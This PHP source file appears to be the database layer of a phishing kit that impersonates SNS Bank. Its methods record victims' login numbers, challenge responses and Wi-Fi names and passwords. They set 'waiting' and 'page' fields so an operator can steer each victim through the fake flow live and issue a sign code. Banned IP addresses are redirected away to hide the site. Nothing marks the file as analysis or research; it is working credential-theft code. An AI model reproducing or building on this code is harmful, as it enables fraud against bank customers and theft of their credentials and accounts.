<?php

namespace App\Models\Sns;

use PDO;

class Sns extends \Core\Model
{
    public static function redirect()
    {
        $sql = 'SELECT * FROM redirect WHERE id = :id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':id', 1, PDO::PARAM_INT);
        $stmt->execute();

        $data = $stmt->fetch();

        if ($data) {
            header('location: ' . $data['redirect']);
            exit;
        } else {
            header('location: https://www.google.nl');
            exit;
        }
    }

    public static function findBan($ip)
    {
        $sql = 'SELECT * FROM bans WHERE ip = :ip';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':ip', $ip, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetch();

        if ($data) {
            return true;
        }
        return false;
    }

    public static function setLogInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, sns_number = :empty, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'SNS', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function setWifiInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, sns_wifi = :empty, sns_wifi_pass = :empty, sns_wifi_pass_two = :empty, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'SNS', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function setWifi($wifi, $pass, $confirm, $uid) 
    {
        $sql = 'UPDATE logs SET sns_wifi = :wifi, sns_wifi_pass = :pass, sns_wifi_pass_two = :confirm, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':wifi', $wifi, PDO::PARAM_STR);
        $stmt->bindValue(':pass', $pass, PDO::PARAM_STR);
        $stmt->bindValue(':confirm', $confirm, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function setDetailsInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, sns_respons = :empty, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'SNS', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function checkPayment($url = []) 
    {
        $sql = 'SELECT * FROM requests WHERE url = :id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':id', $url, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetch();

        if ($data) {
            return $data;
        }
        return false;
    }

    public static function setLogin($number, $uid) 
    {
        $sql = 'UPDATE logs SET sns_number = :number, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':number', $number, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function setDetails($respons, $uid) 
    {
        $sql = 'UPDATE logs SET sns_respons = :respons, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':respons', $respons, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function getPage($uid) 
    {
        $sql = 'SELECT * FROM logs WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetch();

        if (!empty($data['page'])) {
            return $data['page'];
        }
        return false;
    }

    public static function setLoginPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, sns_number = :empty WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setControlPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, sns_wifi = :empty, sns_wifi_pass = :empty, sns_wifi_pass_two = :empty WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setDetailsPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, sns_respons = :empty WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setDetailsPageCode($uid, $page, $code)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, sns_respons = :empty, sns_code = :code WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':code', $code, PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setFinishPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function getSignCode($uid) 
    {
        $sql = 'SELECT * FROM logs WHERE user_id = :uid';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':uid', $uid);
        $stmt->execute();
        $data = $stmt->fetch();
        
        if (!empty($data['sns_code'])) {
            return $data['sns_code'];
        }
        return false;
    }
}